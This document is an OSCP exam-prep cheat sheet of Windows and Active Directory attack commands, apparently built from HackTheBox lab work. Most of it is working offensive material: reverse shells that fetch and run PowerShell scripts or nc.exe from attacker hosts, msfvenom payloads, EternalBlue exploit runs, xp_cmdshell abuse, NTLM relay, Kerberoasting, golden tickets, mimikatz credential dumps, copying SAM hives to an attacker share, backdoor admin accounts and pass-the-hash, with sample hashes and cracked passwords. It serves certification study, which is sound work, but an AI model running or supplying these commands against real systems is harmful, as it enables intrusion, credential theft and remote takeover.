# OSCP Cheat Sheets Windows
Preparation for OSCP
https://www.ired.team/
https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf

## RECON


### SMB
```console
nmap -Pn -sT -n --script smb-enum-shares.nse  10.10.10.40 -p 135,139,445
```
```console
smbclient -L 10.10.10.40 -U <users>%<pwd> 2>/dev/null 
smbclient -L 10.10.10.40 -N 
smbclient //10.10.10.40/Users -N

# Enumerate files
smbclient -L 10.10.10.125 -N 2>/dev/null | grep "Disk" | awk '{print $1}' | while read shared; do echo "${shared} - "; smbclient -N //10.10.10.125/${shared} -c 'dir'; echo; done 
```
```console
smbmap -H 10.10.10.40 -u ''
```
```Shell
# Enumerate files
mkdir smbFolder
mount -t cifs //10.10.10.40/SYSVOL /tmp/smbFolder -o username=null,password=null,domain=WORKGROUP,rw
mount -t cifs "//10.10.10.103/Department Shares" folder  -o vers=2.1
tree # view files

find . -type d | while read dir; do touch ${dir}/jenriquez 2>/dev/null && echo "${dir}" && rm ${dir}/jenriquez; mkdir ${dir}/jenriquez 2>/dev/null && echo "${dir}" && rmdir ${dir}/jenriquez; done 

watch -d "ls /mnt/folder/public/*; /mnt/folder/otro*"

```
```Shell
smbcacls //10.10.10.40/Users Admin/Desktop -N
smbcacls //10.10.10.40/Users Admin/Desktop -N | grep Everyone
```


### rpcclient
```Shell
rpcclient -U "" 10.10.10.52 #null session
enumdomusers

rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "enumdomusers"

# Enumerate users
rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "enumdomusers" | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]' | while read rid; do rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "queryuser $rid" | grep -i "User Name"; done

rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "enumdomgroups"  # grupos
rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "querygroupmem 0x200"  #miembros del grupo x
rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "queryuser 0x200"  # usuario
```
```Shell
echo "hexhexhehx" | xxd -ps -r 
```

### Transer file

```Shell
root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
PS C:\Users\kostas\Desktop> certutil.exe -f -urlcache -split http://10.10.14.2/bfill.exe bfill.exe
```
```Shell
root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
C:\Users\kostas\Desktop>powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.2/bfill.exe','C:\Users\kostas\Desktop\bfill-2.exe')"
```
```Shell
root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
powershell Invoke-WebRequest "http://10.10.14.2/bfill.exe" -OutFile "C:\Users\kostas\Desktop\bfill-3.exe"
```
```Shell
root@kali:/OSCPv3/htb/Optimum# impacket-smbserver folder $(pwd)
copy \\10.10.14.2\folder\bfill.exe C:\Users\kostas\Desktop\exploit.exe

root@kali:/OSCPv3/htb/Optimum# impacket-smbserver folder $(pwd) -smb2support -username <user> -password <pwd>
net use \\10.10.14.2\folder /u:<user> /p:<pwd>
copy file.txt \\10.10.14.2\folder\file.txt

#C:\Users\kostas\Desktop>powershell -exec Bypass -C "New-PSDrive -Name 'SharedFolder' -PSProvider 'FileSystem' -Root '\\10.10.14.2\folder'"
#C:\Users\kostas\Desktop>copy SharedFolder:\bfill.exe C:\Users\kostas\Desktop\exploit.exe
```


## Vulnerability Discovery

```Shell
nmap -Pn -sT -n --script "vuln and safe" 10.10.10.40 -p 135,139,445
```
```Shell
searchsploit eternalblue
searchsploit -x 42315
searchsploit -m 42315
```


## Explotation

### RDP
```Shell
xfreerdp /u:<user> /p:<pwd> /v:<ip> /f
```

### Firewall
```Shell
netsh advfirewall firewall add rule name="SMB" protocol=TCP dir=in localport=445 action=allow
netsh advfirewall firewall add rule name="SMB" protocol=TCP dir=out localport=445 action=allow
```

```Shell
grep -r "cpassword" . 2>/dev/null
```

### Responder
```Shell
responder -I tun0 
```
#Inveigh  - Responder Windows version
https://github.com/Kevin-Robertson/Inveigh.git


### SQL
```Shell
sqsh -S 10.10.10.125 -U 'sa'
```

```Shell
/usr/share/doc/python-impacket/examples/mssqlclient.py WORKGROUP/reporting:PcwTWTHRwryjc\$c6@10.10.10.125 -db volume  -windows-auth
SQL> SP_CONFIGURE "show advanced options", 1
SQL> reconfigure
SQL> SP_CONFIGURE "xp_cmdshell", 1
SQL> reconfigure
SQL> xp_cmdshell "whoami"
# Get shell
SQL> xp_cmdshell "powershell Invoke-WebRequest http://10.10.14.7/nc.exe -o C:\Windows\Temp\nc.exe"
SQL> xp_cmdshell "start /b C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.7 443"
```

```shell
# Capture hash 
SQL> xp_dirtree '\\10.10.14.7\algo'
mssql-svc::QUERIER:5890d2ad2897e641:347A0136C3E30308B159CC3CA9B94AB0:01010000000000008070AE33E608D8015E3FB7F6F0A5952C00000000020008004600540048004D0001001E00570049004E002D00570059004E004100370043004400340034004800520004003400570049004E002D00570059004E00410037004300440034003400480052002E004600540048004D002E004C004F00430041004C00030014004600540048004D002E004C004F00430041004C00050014004600540048004D002E004C004F00430041004C00070008008070AE33E608D8010600040002000000080030003000000000000000000000000030000053744682CCB052C3C439A4E4224A65E6F6EA26598195450C9A37C27CAB683EA90A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003700000000000000000000000000
john --wordlist=rockyou.txt hash.txt
hashcat -m 5600 mssql-svc.netntlmv2 rockyou.txt -o cracked.txt --force
```

```Shell
# Enumerate tables
>SELECT TABLE_NAME FROM <database>.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
>go
>go -m cvs > output.cvs
>go -m html > output.html
>USE <database>:
>go
```

### SMB relay
```Shell
responder -I tun0 
responder -I tun0 -rdw
\\SQLServer\hola
john --wordlist=rockyou.txt hash.txt
hashcat -m 5600 mssql-svc.netntlmv2 rockyou.txt -o cracked.txt --force
```

### SMB ntlmrelayx - SMB signing:false
```Shell
# nano /etc/responder/Responder.conf
# Off SMB
responder -I tun0 -rdw
impacket-ntlmrelayx  -tf target.txt -smb2support
# get hash NTLM
impacket-ntlmrelayx  -tf target.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443"
\\SQLServer\hola
```

### SMB IPv6
```Shell
mitm6 -d yuncorp.local
```

### AD
https://book.hacktricks.xyz/windows/active-directory-methodology
*** importante sincronisar tiempo con DC "rdate -n 10.10.10.52"

```Shell
crackmapexec smb 192.168.100.0/24 
```

#### Enumerate
#Required credentials user
```Shell
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
crackmapexec smb 192.168.100.19 -u root -p <pwd> --local-auth -x whoami 
impacket-psexec yuncorp.local/Administrator:P@\$\$w0rd\!@192.168.100.19 cmd.exe
impacket-psexec workgroup/root:pwd@192.168.100.19 cmd.exe
```
```Shell
powershell -exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.17/powercat.ps1');powercat -c 192.168.100.17 -p 443 -e cmd"
```

```Shell
# Sessions
powershell
PS C:\> Set-ExecutionPolicy Unrestricted
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName pc-user
Get-NetSession -ComputerName dc01
```
```Shell
# Windows - Enumerate users
net user
net user /domain
net user yenriquez /domain
net group /domain
#Get SID
wmic useraccount get name,sid
```
```Shell
# Linux - Enumerate users
# To Domain controller with any domain user
impacket-GetADUsers -all  yuncorp.local/yenriquez -dc-ip 192.168.100.20
```
```Shell
crackmapexec smb 10.10.10.52 -u 'James' -p 'J@m3s_P@ssW0rd!' --shares
```
```Shell
# Enumerate users
https://github.com/insidetrust/statistically-likely-usernames
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=/opt/SecLists/Usernames/Names/names.txt 10.10.10.52
kerbrute userenum --domain htb.local /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52 
```
```Shell
 #To domain controller with any user domain
 ldapdomaindump -u 'yuncorp.local\yenriquez' -p 'P@$$w0rd!' 192.168.100.20
```
```console
powershell
PS C:\> Set-ExecutionPolicy Unrestricted
# Enumerate SPNs
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
{
$prop
}
}
```

#### attacks

##### Spray Password Spraying
```Shell
crackmapexec smb <IP> -u users.txt -p passwords.txt
kerbrute -domain yuncorp -users users.txt -password pass.txt -outputfile output.txt
```

##### Kerberoasting
https://www.hackingarticles.in/abusing-kerberos-using-impacket/
1.- Dump in memory
2.- Request TGS

###### Dump in memory
```Shell
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```
```console
powershell
PS C:\> Set-ExecutionPolicy Unrestricted

Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
klist

mimikatz # kerberos::list /export
Invoke-Mimikatz -Command '"kerberos::list /export"'
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-USER@HTTP~Corp.corp.com-CORP.COM.kirbi
```

###### Request TGS
```Shell
impacket-GetUserSPNs yuncorp.local/yenriquez -dc-ip 192.168.100.20  # know SPNs
impacket-GetUserSPNs -request 'yuncorp.local/yenriquez:P@$$w0rd!' -dc-ip 192.168.100.20 # Get TGS to any service
```
```Shell
powershell
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\> import-module ./invoke-kerberoast.ps1
PS C:\> invoke-kerberoast -outputformat hashcat
```
powershell
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\> import-module ./Invoke-Mimikatz.ps1

```Shell
hashcat -m 13100 -a 0 hash_spn.txt /usr/share/wordlists/rockyou.txt rockyou.txt --force
hashcat -m 13100 -a 0 hash_spn.txt /usr/share/wordlists/rockyou.txt --show --force
```

##### ASPREPRoast Attack - Get tickets without pwd
```Shell
rpcclient -U "jenriquez" -W <pwd> 192.168.100.20
>enumdomusers
```
```Shell
# User configurate = DONT_REQ_PREAUTH - Create packet KRB_AS_REQ
impacket-GetNPUsers yuncorp.local/ -usersfile users.txt -format john -outputfile hash_2.txt -dc-ip 192.168.100.20 
impacket-GetNPUsers 'yuncorp.local/yenriquez:P@$$w0rd!' -format john -outputfile hash.txt -dc-ip 192.168.100.20
impacket-GetNPUsers 'yuncorp.local/yenriquez:P@$$w0rd!' -format hashcat -outputfile hash.txt -dc-ip 192.168.100.20
```
```Shell
#Crack
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

#### Golden ticket attack - create TGT - first get the krbtgt hash NTLM 
#Required Admin Domain - Attack to Domain controller

```Shell
powershell
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\> Import-Module .\Invoke-Mimikatz.ps1
PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"' > output.txt
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /domain:yuncorp.local /sid:<sid> /rc4:<krbtgt hash> /user:Administrador /ticket:golden.kirbi"' # SID get output.txt
# Machine User Domain
mimikatz.exe
kerberos:ptt gold.kirbi
exit
>dir \\DC\admin$
>dir \\DC\c$

# get shell 
impacket-ticketer -nthast <krbtgt_ntlm> -domain-sid <sid> -domain yuncorp.local Administrator  #output Administrator.ccache
export KRB5CCNAME=/root/Administrator.ccache
impacket-psexec -k -n yuncorp.local/Administrator@DC-Corp cmd.exe   # Add domain in /etc/hosts
```
  
#### Kerberos MS14-068
https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html

https://raw.githubusercontent.com/mubix/pykek/master/ms14-068.py
```Shell
impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
```


### Shells
```Shell
# impacket-smbserver folder $(pwd)   
start /b \\10.10.14.7\folder\nc.exe -e cmd 10.10.14.7 443
# nc -lvnp 443
```
```Shell
root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
10.10.10.8 - - [12/Jan/2022 21:58:35] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```
```Shell
powershell.exe -exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.17/powercat.ps1');powercat -c 192.168.100.17 -p 443 -e cmd"

C:\Users\kostas\Desktop>start /b C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe -exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443"
C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe -exec Bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443"
```
```Shell
PS C:\> [Environment]::Is64BitOperatingSystem
PS C:\> [Environment]::Is64BitProcess
```

### Crack

```Shell
# Hast NetNTLM
root@kali:/OSCPv3/htb/Optimum# cat hash 
kostas::OPTIMUM:4141414141414141:cb75e848816d72f0887c979360a94c8d:01010000000000008049ffc23c08d801d13ac8046c9c0773000000000100100062004f0056006c004c006300560043000200100053005100730044004600540044004f000300100062004f0056006c004c006300560043000400100053005100730044004600540044004f00070008008049ffc23c08d80106000400020000000800300030000000000000000000000000200000427ee1a135839f2e7cdb03560c68c4af3fd234632cc4c0ce7480b21dc9de2fb40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003200000000000000000000000000
```
```Shell
root@kali:/OSCPv3/htb/Optimum# john --wordlist=pwd.txt hash_impacket_smb 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/32])
Press 'q' or Ctrl-C to abort, almost any other key for status
kdeEjDowkS*      (kostas)
1g 0:00:00:00 DONE (2022-01-12 23:21) 100.0g/s 100.0p/s 100.0c/s 100.0C/s kdeEjDowkS*
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Exploits

#### WebDAV IIS 6
```Shell
cadaver 10.10.10.15 
dav:/> put cmd.txt
dav:/> move cmd.txt cmd.aspx
```
```Shell
# davtest -url http://10.10.10.15
```

#### Eternalblue
```Shell
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py
python 42315.py 10.10.10.40
```
```Shell
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o exploit.exe EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444
python 42315.py 10.10.10.40 samr exploit.exe 
```
```Shell
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
python eternal_checker.py 10.10.10.40

./shell_prep.sh 
python eternalblue_exploit7.py 10.10.10.40 sc_x64.bin 

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444
python eternalblue_exploit7.py 10.10.10.40 sc_x64_msf.bin
```
https://github.com/worawit/MS17-010.git
```Shell
python checker.py 127.0.0.1
python zzz_exploit.py 127.0.0.1 samr
```

## Post Explotation

### Windows Users
```Shell
net users
net user admin admin /add
net localgroup administrators
net localgroup administrators admin /add
net localgroup "Remote Desktop Users" admin /add
```

### Crackmapexec
```Shell
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' -x 'whoami'
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' --sam
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' --local-auth --wdigest enable
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' --rid-brute
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' -M rdp -o action=enable # activate rdp
crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -x 'whoami'
crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -M mimikatz -o COMMAND="privilege::debug token::elevate sekurlsa::logonpasswords exit"
crackmapexec smb 10.10.10.40 -u 'admin' -p 'kdeEjDowkS*' -x '\\10.10.14.2\smbfolder\nc.exe -e cmd 10.10.14.2 4444'
```

### Windows SAM
```Shell
reg save HKLM\SAM sam.backup
reg save HKLM\SYSTEM system.backup

impacket-smbserver smbfolder $(pwd)
copy sam.backup \\10.10.14.28\smbfolder\sam
copy system.backup \\10.10.14.28\smbfolder\system

pwdump system sam 
```

### Windows psexec
```Shell
#reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
#user with admin priv
python /opt/impacket/examples/psexec.py WORKGROUP/admin:admin\@10.10.10.40 cmd.exe
python /usr/share/doc/python-impacket/examples/psexec.py WORKGROUP/kostas:kdeEjDowkS*@10.10.10.8 cmd.exe
```

### Windows wmiexec
```Shell
impacket-wmiexec 'administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'
```


### Pass-The-Hash
```Shell
pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:d90b270062e8b9f118ab8e0f733df391 //10.10.10.8 cmd.exe
```

### PortForwarding
```Shell
impacket-smbserver folder $(pwd) 
copy \\10.10.14.7\folder\plink.exe plink.exe
plink.exe -P 445 -l root -pw <pwd> -R 4445:127.0.0.1:445 10.10.14.7
#sshd_config
KexAlgorithms +diffie-hellman-group1-sha1
Ciphers +aes128-cbc
```


## Priv
https://github.com/SecWiki/windows-kernel-exploits

#PowerUp.ps1
```Shell
powershell
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\Users\kostas\Desktop> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1');Invoke-AllChecks;
PS C:\Users\kostas\Desktop> Import-Module ./PowerUp.ps1
PS C:\Users\kostas\Desktop> Invoke-AllChecks | Out-File -Encoding ASCII PowerUp.txt
```
#Wesng
https://github.com/bitsadmin/wesng
```Shell
root@kali:/OSCPv3/htb/Optimum# python /opt/wesng/wes.py systeminfo.txt
root@kali:/OSCPv3/htb/Optimum# python /opt/wesng/wes.py systeminfo.txt -i "Elevation Privilege"
``` 

#Windows-Exploit-Suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
```Shell
root@kali:/OSCPv3/htb/Optimum# python windows-exploit-suggester.py --update
root@kali:/OSCPv3/htb/Optimum# python windows-exploit-suggester.py --database 2022-01-12-mssb.xls  --systeminfo systeminfo.txt
```

### Modifiable Service Abuse
#Enumerates all services and returns services for which the current user can modify the binPath
```Shell
powershell
PS C:\> Set-ExecutionPolicy Unrestricted
Import-Module .\Powerup.ps1
Invoke-ServiceAbuse -Name 'UsoSvc' -Command "C:\Windows\Temp\nc.exe -e cmd 10.10.14.7 443"
```

#Enumerates the paths stored in Env:Path (%PATH) and filters each through Get-ModifiablePath to return the folder paths the current user can write to
```Shell
powershell
PS C:\> Set-ExecutionPolicy Unrestricted
Import-Module .\Powerup.ps1
Find-PathDLLHijack
```

### Group policy preferences
https://adsecurity.org/?p=2288
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
https://raw.githubusercontent.com/BustedSec/gpp-decrypt/master/gpp-decrypt.rb
```Shell
ruby gpp-decrypt.rb
```

### Exploits

#### MS16-098 - CVE-2016-3309 - Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow
https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe

#### MS16-032 - CVE-2016-0099 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032

